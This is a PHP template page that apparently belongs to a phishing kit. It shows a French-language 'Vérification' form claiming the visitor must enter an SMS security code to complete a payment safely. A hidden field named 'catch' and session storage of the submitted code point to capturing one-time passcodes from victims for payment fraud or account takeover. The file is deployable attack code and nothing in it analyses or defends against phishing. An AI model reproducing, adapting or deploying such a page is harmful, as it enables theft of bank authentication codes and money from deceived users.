<?php
require_once 'config/panel.php';

ob_start();
?>

<div style="min-height:500px;" class="w-100 d-flex flex-column justify-content-start align-items-center bg-white p-3">


<form class="container p-3 my-3 carda shadow rounded-3" action="index.php?<?= md5(time()) ?>" method="post">
     <input type="hidden" name="catch">
     <div>
		<h1>Vérification</h1>
      <h6>Pour votre sécurité, nous devons nous assurer qu'il s'agit bien de vous.</h6>
      <p style="font-size: 14.8px;color:#4d677a;">Nous vous enverrons un SMS avec un code de sécurité<br>Veuillez saisir le code reçu</p>
     </div>
    
	 <p></p>
         <div style="background-color: transparent;" class="form-floating my-3">
          <input style="background-color: transparent;" type="text" name="sms" maxlength="10" class="form-control <?php if ($_SESSION['ERRORS']['sms']) { echo 'is-invalid'; } ?>" id="floatingPassword" placeholder="Veuillez saisir le code reçu" value="<?php if (!empty($_SESSION['ssms'])){ echo $_SESSION['ssms'];} ?>">
          <label style="background-color: transparent;" for="floatingPassword">Code SMS *</label>
          <div class="invalid-feedback">Code SMS invalid</div>
         </div>
		 <p style="font-size: 14.8px;color:#4d677a;">Cette étape est nécessaire pour effectuer votre paiement en toute sécurité.</p>

        <div class="mt-3">
            <p style="font-size: 12.8px;color:#4d677a;">Les champs marqués d'un astérisque (*) dans ce formulaire sont obligatoires car nous avons besoin de ces informations pour traiter votre commande.</p>
         </div>

         <div class="w-100 d-flex justify-content-end align-items-center">
 <button name="submit" value="sms" type="submit" style="font-family: bold-font;width:136px;font-size:14px;background-color:#ffc905;" class="btn btn-warning my-3 p-3 rounded-3">Continuer</button>
 </div>
    </form>

</div>

<?php $content = ob_get_clean(); ?>
<?php require_once 'views/layout.php' ?>